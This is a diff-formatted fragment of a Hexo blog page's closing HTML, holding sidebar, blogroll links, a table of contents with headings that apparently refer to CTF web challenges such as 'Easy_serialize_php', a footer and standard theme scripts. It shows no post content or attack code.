+                    <span class="site-state-item-name">标签</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+             <div class="cc-license motion-element" itemprop="license">
+              
+              
+                
+              
+              
+              
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+             </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hengyud.cn" title="https://hengyud.cn" rel="noopener" target="_blank">小P</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.lookupes.cn" title="http://blog.lookupes.cn" rel="noopener" target="_blank">孙哥</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://timeshu.github.io" title="https://timeshu.github.io" rel="noopener" target="_blank">Time</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://zo1ro.github.io" title="http://zo1ro.github.io" rel="noopener" target="_blank">imy0r1in</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://jgeek.cn/" title="https://jgeek.cn/" rel="noopener" target="_blank">\0x584A</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#这真的不是文件上传"><span class="nav-number">2.</span> <span class="nav-text">这真的不是文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy-serialize-php"><span class="nav-number">3.</span> <span class="nav-text">Easy_serialize_php</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">安大侠</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.2"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.2"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
